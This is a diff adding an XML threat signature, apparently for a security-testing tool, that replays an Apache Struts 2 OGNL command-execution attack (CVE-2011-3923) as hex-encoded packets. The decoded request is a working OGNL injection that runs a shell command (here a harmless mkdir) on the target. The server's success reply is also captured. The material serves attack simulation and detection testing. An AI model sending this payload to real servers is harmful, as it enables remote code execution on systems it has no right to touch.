@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apache Struts 2 ParametersInterceptor OGNL Command Execution"/>
+    <EngDesc display="true" value="A command execution vulnerability exists in the web application framework Apache Struts2. The vulnerability is&#13;&#10;due to insufficient input validation in the ParametersInterceptor component when parsing incoming HTTP requests.&#13;&#10;A remote attacker can leverage this vulnerability by sending a crafted HTTP request to a target system.&#13;&#10;In an attack scenario, where arbitrary commands are executed on the target machine, the malicious command&#13;&#10;will be executed within the security context of the target service."/>
+    <Intent display="true">
+      <item value="Command_Execution"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apache_Software_Foundation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Struts_2"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_2.3.1.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20120123-04"/>
+    <CVEID display="true" value="CVE-2011-3923"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="78109"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="768405be4b6fb76841b3a3a5c3217e2e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="Network"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634683754770078950"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1338543034" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:5A:1D:9B" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="017D" Identification="E94F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="EE62" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="39196" destPort="$HTTPdestPort" SeqNumber="819F114C" AckNumber="65AA0BF0" HeaderLength="08" WindowSize="002E" Checksum="A730" UrgentPointer="0000" Options="0101080AEC4DF8076344E985" Payload="474554202F4356455F323031315F333932332F706F632E616374696F6E3F74736C3D28253233636F6E746578745B25323278776F726B2E4D6574686F644163636573736F722E64656E794D6574686F64457865637574696F6E2532325D2533442B6E65772B6A6176612E6C616E672E426F6F6C65616E2866616C7365292C2532302532335F6D656D6265724163636573735B253232616C6C6F775374617469634D6574686F644163636573732532325D2533642B6E65772B6A6176612E6C616E672E426F6F6C65616E2874727565292C253230406A6176612E6C616E672E52756E74696D654067657452756E74696D6528292E65786563282532376D6B6469722532302F746D702F54534C2532372929286D656829267A5B2874736C29282532376D6568253237295D3D7472756520485454502F312E310D0A486F73743A646863703136360D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:5A:1D:9B" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0225" Identification="E276" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F493" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="39196" SeqNumber="65AA0BF0" AckNumber="819F1295" HeaderLength="08" WindowSize="00D7" Checksum="8033" UrgentPointer="0000" Options="0101080A6344E9D6EC4DF807" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5365742D436F6F6B69653A204A53455353494F4E49443D41323133413037353433303842373841373635324635303230373039444134333B20506174683D2F4356455F323031315F333932330D0A436F6E74656E742D547970653A20746578742F68746D6C3B636861727365743D49534F2D383835392D310D0A436F6E74656E742D4C656E6774683A203237310D0A446174653A205475652C203133204D617220323031322032323A33303A323620474D540D0A0D0A0A0A3C21444F43545950452068746D6C205055424C494320222D2F2F5733432F2F4454442048544D4C20342E3031205472616E736974696F6E616C2F2F454E222022687474703A2F2F7777772E77332E6F72672F54522F68746D6C342F6C6F6F73652E647464223E0A3C68746D6C3E0A3C686561643E0A3C6D65746120687474702D65717569763D22436F6E74656E742D547970652220636F6E74656E743D22746578742F68746D6C3B20636861727365743D49534F2D383835392D31223E0A3C7469746C653E446F6E6520416374696F6E3C2F7469746C653E0A3C2F686561643E0A3C626F64793E0A3C68313E446F6E6520416374696F6E3C2F68313E0A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
